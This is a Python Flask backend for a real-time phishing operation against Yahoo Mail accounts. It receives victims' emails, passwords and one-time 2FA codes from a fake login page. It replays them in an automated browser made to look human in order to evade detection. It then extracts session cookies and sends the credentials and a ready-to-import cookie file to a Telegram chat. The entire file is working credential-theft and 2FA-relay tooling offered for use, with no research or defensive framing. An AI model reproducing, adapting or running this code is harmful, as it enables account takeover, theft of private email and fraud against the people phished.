from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
from playwright.async_api import async_playwright
import time
import random
import json
import telebot
from threading import Thread
from flask import send_from_directory
import os

app = Flask(__name__)
CORS(app)


BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
CHAT_ID = -1004401856043
bot = telebot.TeleBot(BOT_TOKEN)

USER_AGENT = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"

IMPORTANT_COOKIES = {"Y", "T", "A1", "A3", "AS", "OTH", "OTHD", "PH", "F", "GUC", "GUCS", "FS", "_ebd", "A1S"}

sessions = {}

def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling error, retrying in 5s: {e}")
            time.sleep(5)

async def human_type(page, selector, text, fast=False):
    await page.wait_for_selector(selector, timeout=15000)
    if fast:
        await page.type(selector, text, delay=random.uniform(10, 40))
    else:
        for char in text:
            await page.type(selector, char)
            await asyncio.sleep(random.uniform(0.08, 0.25))

async def random_mouse_move(page):
    for _ in range(random.randint(6, 12)):
        x = random.randint(100, 900)
        y = random.randint(100, 700)
        await page.mouse.move(x, y)
        await asyncio.sleep(random.uniform(0.3, 0.8))

@app.route("/")
def home():
    return send_from_directory(".", "index.html")

@app.route("/<path:path>")
def static_files(path):
    if os.path.exists(path):
        return send_from_directory(".", path)
    return "Not Found", 404

@app.route('/start_login', methods=['POST'])
def start_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    landing_url = data.get('landing_url')

    if not email or not password:
        return jsonify({"error": "Missing credentials"}), 400

    if not landing_url:
        landing_url = "Unknown Domain"

    session_id = str(int(time.time() * 1000))
    sessions[session_id] = {
        "email": email,
        "password": password,
        "landing_url": landing_url,
        "status": "pending"
    }

    Thread(target=lambda: asyncio.run(run_login(session_id)), daemon=True).start()
    
    return jsonify({"success": True, "session_id": session_id})

@app.route('/submit_2fa', methods=['POST'])
def submit_2fa():
    data = request.json
    session_id = data.get('session_id')
    code = data.get('code')

    if not session_id or not code:
        return jsonify({"success": False, "error": "Missing data"}), 400

    session = sessions.get(session_id)
    if not session or session.get("status") != "waiting_2fa":
        return jsonify({"success": False, "error": "Not waiting for 2FA"}), 400

    Thread(target=lambda: asyncio.run(enter_2fa_code(session_id, code)), daemon=True).start()
    return jsonify({"success": True})

async def run_login(session_id):
    session = sessions.get(session_id)
    email = session["email"]
    password = session["password"]

    bot.send_message(CHAT_ID, f"🔄 Starting login for {email}")

    async with async_playwright() as p:
        try:
            browser = await p.chromium.launch(
                headless=False,
                args=['--start-maximized', '--no-sandbox', '--disable-dev-shm-usage']
            )
            context = await browser.new_context(user_agent=USER_AGENT)
            page = await context.new_page()

            session["browser"] = browser
            session["context"] = context
            session["page"] = page

            await page.goto("https://login.yahoo.com/", wait_until="domcontentloaded")
            await asyncio.sleep(8)

            await human_type(page, 'input[name="username"]', email)
            await random_mouse_move(page)
            await page.click('button[type="submit"]')
            await asyncio.sleep(8)

            await human_type(page, 'input[name="password"]', password)
            await random_mouse_move(page)
            await page.click('button[type="submit"]')
            await asyncio.sleep(10)

            for _ in range(15):
                try:
                    await page.click("text=/Skip|skip|Not Now|Use password|Try another way|Continue|Next/i", timeout=6000)
                    await asyncio.sleep(random.uniform(3, 6))
                except:
                    pass

            await asyncio.sleep(10)

            if "mail.yahoo.com" in page.url.lower() or ".search.yahoo.com" in page.url.lower():
                bot.send_message(CHAT_ID, f"✅ Login successful for {email} (No 2FA)")
                await finish_login(page, context, email, password, session_id, browser)
            else:
                session["status"] = "waiting_2fa"
                bot.send_message(CHAT_ID, f"🔐 2FA required for {email}. Enter code on webpage.")

        except Exception as e:
            import traceback
            print(f"LOGIN ERROR for {email}:", flush=True)
            print(traceback.format_exc(), flush=True)
            bot.send_message(CHAT_ID, f"❌ Error for {email}\n{str(e)[:250]}")
            sessions.pop(session_id, None)


async def enter_2fa_code(session_id, code):
    session = sessions.get(session_id)
    if not session: return

    page = session.get("page")
    context = session.get("context")
    browser = session.get("browser")
    email = session["email"]
    password = session["password"]

    try:
        await human_type(page, 'input[name*="code"], input[autocomplete="one-time-code"], input[type="text"]', code, fast=True)
        await asyncio.sleep(2)
        await page.click('button[type="submit"]')
        await asyncio.sleep(10)

        await finish_login(page, context, email, password, session_id, browser)

    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ 2FA failed for {email}")
        sessions.pop(session_id, None)

async def finish_login(page, context, email, password, session_id, browser):
    try:
        await page.goto("https://mail.yahoo.com/", wait_until="domcontentloaded")
        await asyncio.sleep(12)
        await page.reload(wait_until="domcontentloaded")
        await asyncio.sleep(15)

        await random_mouse_move(page)
        for _ in range(5):
            await page.evaluate(f"window.scrollTo(0, document.body.scrollHeight * {random.uniform(0.3,0.9)})")
            await asyncio.sleep(random.uniform(4, 7))
            await random_mouse_move(page)
        await page.evaluate("window.scrollTo(0, 0)")
        await asyncio.sleep(8)

        all_cookies = await context.cookies()
        clean_cookies = [c for c in all_cookies if c['name'] in IMPORTANT_COOKIES]

        for c in clean_cookies:
            c['sameSite'] = 'no_restriction' if c.get('sameSite') in [None, 'None'] else 'lax'

        cookie_count = len(clean_cookies)

        landing_url = sessions.get(session_id, {}).get("landing_url", "Unknown Domain")

        message = f"""✨ Session Information ✨
👤 Username: ➖ {email}
🔑 Password: ➖ {password}
🌐 Landing URL: ➖ {landing_url}
🖥️ User Agent: ➖ {USER_AGENT}
🌍 Remote Address:➖ No Proxy
📦 Total Cookies: ➖ {cookie_count} (Important Only)
🕒 Create Time: ➖ {int(time.time())}
🕔 Update Time: ➖ {int(time.time() + 72)}
"""
        bot.send_message(CHAT_ID, message)

        txt_filename = f"tokens_{email.split('@')[0]}.txt"
        with open(txt_filename, "w", encoding="utf-8") as f:
            f.write(f"Email: {email}\nPassword: {password}\nTotal Important Cookies: {cookie_count}\n\n")
            f.write("# === COPY FROM HERE FOR COOKIE EDITOR ===\n")
            f.write(json.dumps(clean_cookies, indent=2))

        with open(txt_filename, "rb") as f:
            bot.send_document(CHAT_ID, f, caption="📦 Important Cookies Only - Ready for Cookie Editor")

    finally:
        sessions.pop(session_id, None)
        await asyncio.sleep(10)
        await browser.close()

if __name__ == '__main__':
    print("🚀 Backend running on http://0.0.0.0:5001")
    app.run(host="0.0.0.0", port=5001, debug=False)
